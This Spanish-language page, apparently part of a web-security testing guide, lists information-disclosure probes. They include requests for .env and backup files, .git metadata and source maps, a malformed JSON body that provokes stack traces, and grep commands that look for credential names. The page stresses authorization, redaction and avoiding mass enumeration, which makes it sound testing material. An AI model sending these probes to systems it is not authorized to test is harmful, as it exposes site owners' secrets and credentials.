# 🗡️ Divulgación de información: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Archivos de configuración y control de versiones

```text
/.env
/.env.bak
/config.json.bak
/.git/HEAD
/.git/config
```

**Cuándo usarlo:** Una respuesta 200 de SPA no cuenta; detenerse y redactar si aparece un secreto real.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).


### Artefactos de JavaScript y fuente

```text
/static/app.js.map
/assets/app.js.map
/robots.txt
/uploads/
```

**Cuándo usarlo:** Un mapa o lista de rutas es inventario hasta demostrar exposición de información privada.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/information-disclosure).


## 🧭 Payloads por contexto

### Errores y debug de una ruta propia

```http
POST /api/v1/test HTTP/1.1
Host: {ORIGEN}
Content-Type: application/json

{
```

**Cuándo usarlo:** Un error de parser puede mostrar stack trace; verificar sensibilidad del dato, no solo el código 500.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).


## 🔥 Payloads avanzados

### Buscar nombres sin imprimir valores

```bash
rg -l -i '(secret|token|password|api[_-]?key)' ./dist
git log --all --name-only --pretty=format: | rg -i '(\.env|secret|credential)'
```

**Cuándo usarlo:** Solo sobre copia autorizada. Reportar rutas y prueba redactada, nunca publicar credenciales.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/information-disclosure).


## 🔬 Pruebas guiadas por escenario

### 1. Mapa de fuentes

**Objetivo:** Comprobar exposición de source map y clasificar contenido.

```http
GET /static/app.js.map HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Confirmar formato de mapa, fuentes y datos sensibles; un 200 HTML de SPA no cuenta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

### 2. Cabecera sourceMappingURL

**Objetivo:** Detectar referencia pública en el bundle cargado por la aplicación.

```bash
curl -s "https://{ORIGEN}/static/app.js" | rg -o "sourceMappingURL=[^ ]+"
```

**Interpretación:** El enlace puede apuntar a mapa inexistente o inocuo; no publicar secretos extraídos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

### 3. Archivo de respaldo conocido

**Objetivo:** Comprobar si una copia de un archivo propio quedó servida.

```http
GET /config.json.bak HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Validar tipo de contenido y procedencia; evitar enumeración masiva y redactar valores.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

### 4. Metadatos Git

**Objetivo:** Comprobar si el directorio de control de versiones es accesible.

```http
GET /.git/HEAD HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La cadena ref: confirma exposición parcial; no clonar historia completa sin autorización.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

### 5. Error de parsing acotado

**Objetivo:** Solicitar error controlado para observar stack traces.

```http
POST /api/v1/test HTTP/1.1
Host: {ORIGEN}
Content-Type: application/json

{
```

**Interpretación:** Información interna en error requiere evaluar sensibilidad y alcance; usar endpoint de prueba.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure).

### 6. Índice de directorio

**Objetivo:** Comprobar si una carpeta pública lista archivos no destinados a usuarios.

```http
GET /uploads/ HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Un listado público puede ser intencional; demostrar acceso a archivo sensible permitido por el alcance.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

### 7. Robots como pista

**Objetivo:** Revisar rutas declaradas públicamente sin considerarlas hallazgo automático.

```http
GET /robots.txt HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Las rutas de robots no son secretos; validar acceso y datos antes de reportar.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure).

### 8. Verbose API

**Objetivo:** Comprobar si un modo de depuración controlado expone detalles internos.

```http
GET /api/v1/health?debug=true HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** El parámetro debe existir para ser relevante; no deducir exposición de una respuesta genérica.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure).

### 9. Archivo .env expuesto

**Objetivo:** Comprobar si una configuración de entorno conocida está servida como archivo.

```http
GET /.env HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Verificar Content-Type y una clave de prueba sin registrar valores. Si hay secretos reales, detenerse y pedir rotación.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

### 10. Copia de .env

**Objetivo:** Comprobar una variante concreta de respaldo sin hacer enumeración masiva.

```http
GET /.env.bak HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Un 200 de SPA no cuenta; no descargar ni publicar credenciales si el contenido es real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/information-disclosure/exploiting).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
